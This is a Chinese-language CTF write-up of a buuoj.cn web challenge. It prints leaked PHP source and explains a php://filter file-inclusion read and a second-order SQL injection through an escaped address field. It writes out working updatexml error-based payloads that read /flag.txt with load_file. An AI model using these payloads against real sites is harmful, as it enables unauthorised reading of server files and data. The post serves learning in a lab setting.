刚比赛完的一段时间期末考试云集，没有时间复现题目。趁着假期，争取多复现几道题。
#### 复现平台
buuoj.cn
#### 解题过程
首先进入题目页面
![index](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/index.png)

看起来没有什么特别的，就是一个可以提交信息的页面。查看响应报文也没有什么提示，但是在网页注释里有东西。

```html
<!--?file=?-->
```

这里可能有一个文件包含，尝试payload
```txt
http://xxx.xxx/index.php?file=php://filter/convert.base64-encode/resource=index.php
```
结果得到了当前页面经过加密后的源码
![源码](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/base64.png)

>有关伪协议的内容，可以大致参考下这篇文章：https://www.cnblogs.com/dubhe-/p/9997842.html

```php
<?php
ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>
//HTML页面的代码省略，保留之前说的注释
<!--?file=?-->
```
用同样的方法，根据表单中暴露的位置，获取confirm.php,change.php,search.php等页面的内容。
```php
<?php
#change.php
require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "è®¢åä


```

```php
<?php
#search.php
require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>å§å:".$row['user_name']."</p><p>, çµè¯:".$row['phone']."</p><p>, å°å:".$row['address']."</p>";
    } else {
        $msg = "æªæ¾å°è®¢å!";
    }
}else {
    $msg = "ä¿¡æ¯ä¸å¨";
}
?>
#无用的HTML代码省略
```

分析代码可以知道，每个涉及查询的界面都过滤了很多东西来防止SQL注入，而且过滤的内容非常广泛，很难进行注入。

但是尽管username和phone过滤非常严格，而address却只是进行了简单的转义。经过分析便找到了可以利用的地方。这里提取了一些change.php中和address相关的部分。
```php
$address = addslashes($_POST["address"]);
if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
```
可以看出，address会被转义，然后进行更新，也就是说单引号之类的无效了。但是，在地址被更新的同时，旧地址被存了下来。如果第一次修改地址的时候，构造一个含SQL语句特殊的payload，然后在第二次修改的时候随便更新一个正常的地址，那个之前没有触发SQL注入的payload就会被触发。

思路有了以后，接下来就是构造payload，下面将借助报错注入来构造payload。

#### payload构造
```txt
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),1,20)),0x7e),1)#
```
>直接load_file不能显示全，这里分两次构造payload。

```txt
1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,50)),0x7e),1)#
```

结果如下
![半个flag](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/error.png)
![余下flag](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/flag.png)

#### payload使用

两个payload的使用方法为：

先在初始页面随便输数据，记住姓名电话
![余下flag](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/givemoney.png)

接着修改地址，地址修改为所构造的payload。修改之后再次修改，将地址设置为随便一个正常值，比如1，这样就能看到报错页面。
![修改地址](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/change.png)

如果想要使用新的payload，只需要删除订单在重复以上操作即可。
![删除订单](https://markdown-1255584210.cos.ap-chengdu.myqcloud.com/day1web1/delete.png)
